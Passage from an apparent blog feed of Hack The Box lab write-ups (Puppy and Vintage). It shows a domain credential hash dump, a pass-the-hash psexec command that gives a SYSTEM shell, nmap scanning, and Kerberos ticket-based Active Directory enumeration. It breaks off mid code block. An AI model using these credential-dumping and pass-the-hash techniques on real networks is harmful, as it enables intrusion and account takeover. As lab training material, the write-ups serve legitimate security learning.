&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NL&lt;span class="nv">$KM&lt;/span>:dd1ba5a033e7a0561c3fc3f58631ba091ac4d46a3c2afa1526063b93e0660f7a029ac72e5279c157d90cd3f61779ef3f7588a399c7e02b2756955c6b8581d0ed
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Dumping Domain Credentials &lt;span class="o">(&lt;/span>domain&lt;span class="se">\u&lt;/span>id:rid:lmhash:nthash&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using the DRSUAPI method to get NTDS.DIT secrets
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PUPPY.HTB&lt;span class="se">\l&lt;/span>evi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PUPPY.HTB&lt;span class="se">\a&lt;/span>nt.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PUPPY.HTB&lt;span class="se">\a&lt;/span>dam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PUPPY.HTB&lt;span class="se">\j&lt;/span>amie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PUPPY.HTB&lt;span class="se">\s&lt;/span>teph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PUPPY.HTB&lt;span class="se">\s&lt;/span>teph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Kerberos keys grabbed
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Administrator:aes128-cts-hmac-sha1-96:2c74b6df3ba6e461c9d24b5f41f56daf
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;SNIP&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Cleaning up...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And finally, we got a shell as the administrator using the Administrator&amp;rsquo;s hash for the above dump:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">psexec.py -hashes &lt;span class="s1">&amp;#39;aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;Administrator@dc.puppy.htb&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.11.0 - Copyright &lt;span class="m">2023&lt;/span> Fortra
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Requesting shares on dc.puppy.htb.....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Found writable share ADMIN$
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Uploading file PEFrQaPk.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Opening SVCManager on dc.puppy.htb.....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Creating service sMPL on dc.puppy.htb.....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Starting service sMPL.....
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> Press &lt;span class="nb">help&lt;/span> &lt;span class="k">for&lt;/span> extra shell commands
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Microsoft Windows &lt;span class="o">[&lt;/span>Version 10.0.20348.3453&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>c&lt;span class="o">)&lt;/span> Microsoft Corporation. All rights reserved.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&amp;gt; whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nt authority&lt;span class="se">\s&lt;/span>ystem
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Vintage HTB Writeup</title><link>https://r4z1o.github.io/p/vintage-htb-writeup/</link><pubDate>Sat, 01 Mar 2025 00:00:00 +0000</pubDate><guid>https://r4z1o.github.io/p/vintage-htb-writeup/</guid><description>&lt;img src="https://r4z1o.github.io/p/vintage-htb-writeup/Vintage.png" alt="Featured image of post Vintage HTB Writeup" />&lt;p>This is one of the Boxes that took me a week to solve, but the amount of the information that i learned from it is unbelievable&lt;/p>
&lt;p>As always we start our assessment with a port comprehensive scan that reveals the following results :&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo nmap -v -sV -sC -O -Pn --disable-arp-ping -p- -o Broad-scan-nmap 10.10.11.45
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.11.45
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.073s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">65517&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain Simple DNS Plus
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span class="o">(&lt;/span>server time: 2025-02-17 03:07:34Z&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Microsoft Windows netbios-ssn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: vintage.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp open kpasswd5?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp open tcpwrapped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: vintage.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp open tcpwrapped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span class="o">(&lt;/span>SSDP/UPnP&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Not Found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Microsoft-HTTPAPI/2.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9389/tcp open mc-nmf .NET Message Framing
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49664/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49668/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49685/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">51973/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Warning: OSScan results may be unreliable because we could not find at least &lt;span class="m">1&lt;/span> open and &lt;span class="m">1&lt;/span> closed port
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Device type: general purpose
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Running &lt;span class="o">(&lt;/span>JUST GUESSING&lt;span class="o">)&lt;/span>: Microsoft Windows &lt;span class="m">2022&lt;/span> &lt;span class="o">(&lt;/span>89%&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Aggressive OS guesses: Microsoft Windows Server &lt;span class="m">2022&lt;/span> &lt;span class="o">(&lt;/span>89%&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No exact OS matches &lt;span class="k">for&lt;/span> host &lt;span class="o">(&lt;/span>&lt;span class="nb">test&lt;/span> conditions non-ideal&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Uptime guess: 0.008 days &lt;span class="o">(&lt;/span>since Mon Feb &lt;span class="m">17&lt;/span> 03:57:14 2025&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TCP Sequence Prediction: &lt;span class="nv">Difficulty&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">263&lt;/span> &lt;span class="o">(&lt;/span>Good luck!&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">IP ID Sequence Generation: Incremental
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Host: DC01&lt;span class="p">;&lt;/span> OS: Windows&lt;span class="p">;&lt;/span> CPE: cpe:/o:microsoft:windows
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host script results:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb2-security-mode:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> 3:1:1:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Message signing enabled and required
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb2-time:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> date: 2025-02-17T03:08:34
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ start_date: N/A
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>As it appears SMB &lt;code>port :445&lt;/code>, LDAP &lt;code>port :389&lt;/code> and Kerberos &lt;code>port :88&lt;/code> are open in the box which indicate that this is a Domains Controller. The results above show the domain under which this Server is &lt;code>vintage.htb&lt;/code> .&lt;/p>
&lt;p>As always i tried running NXC using the provided credentials &lt;code>P.Rosa&lt;/code>:&lt;code>Rosaisbest123&lt;/code> and the &lt;code>DC01.vintage.htb&lt;/code> seems to be the DNS Name of the box, but it seems that it is encountering some issue.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo netexec smb 10.10.11.45 -u P.Rosa -p Rosaisbest123
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.45 &lt;span class="m">445&lt;/span> 10.10.11.45 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> x64 &lt;span class="o">(&lt;/span>name:10.10.11.45&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:10.10.11.45&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.45 &lt;span class="m">445&lt;/span> 10.10.11.45 &lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> 10.10.11.45&lt;span class="se">\P&lt;/span>.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo netexec ldap 10.10.11.45 -u P.Rosa -p Rosaisbest123
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LDAP 10.10.11.45 &lt;span class="m">389&lt;/span> dc01.vintage.htb &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> x64 &lt;span class="o">(&lt;/span>name:dc01.vintage.htb&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:vintage.htb&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LDAP 10.10.11.45 &lt;span class="m">389&lt;/span> dc01.vintage.htb &lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> vintage.htb&lt;span class="se">\P&lt;/span>.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This took me a lot of time to figure out. i even thought this is some VPN issue or connection problem, so i googled it and i found this &lt;a class="link" href="https://gist.github.com/mpgn/9fc08b0f0fde55e8c322518bc1f9c317" target="_blank" rel="noopener"
>Scrambled vs NetExec&lt;/a> for someone encountering the same problem on a different HTB Box, and the &lt;code>netexec&lt;/code> feedback information is &lt;code>STATUS_NOT_SUPPORTED&lt;/code>, indicate that NTLM Authentication is disabled.&lt;/p>
&lt;p>For that we will resort to Kerberos Authentication, by obtaining a TGT and export it to the &lt;code>KRB5CCNAME&lt;/code> environment variable.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ getTGT.py vintage.htb/P.Rosa:&lt;span class="s1">&amp;#39;Rosaisbest123&amp;#39;&lt;/span> -dc-ip dc01.vintage.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saving ticket in P.Rosa.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ &lt;span class="nb">export&lt;/span> &lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>P.Rosa.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ klist
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ticket cache: FILE:P.Rosa.ccache
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Default principal: P.Rosa@VINTAGE.HTB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Valid starting Expires Service principal
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">03/17/25 03:51:04 03/17/25 13:51:04 krbtgt/VINTAGE.HTB@VINTAGE.HTB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> renew &lt;span class="k">until&lt;/span> 03/18/25 03:51:04
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Let&amp;rsquo;s test it out, and it seems to be good!&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo netexec smb dc01.vintage.htb -u P.Rosa -d vintage.htb -k --use-kcache
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB dc01.vintage.htb &lt;span class="m">445&lt;/span> dc01 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> x64 &lt;span class="o">(&lt;/span>name:dc01&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:vintage.htb&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB dc01.vintage.htb &lt;span class="m">445&lt;/span> dc01 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> vintage.htb&lt;span class="se">\P&lt;/span>.Rosa from ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I used &lt;code>netexec&lt;/code> to enumerate user and computer accounts through the &lt;code>--rid-kcache&lt;/code> flag, so i saw &lt;code>gMSA01$&lt;/code> and i immediately though about &lt;code>ReadGMSAPassword&lt;/code> ACL which is relevant for these service accounts.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
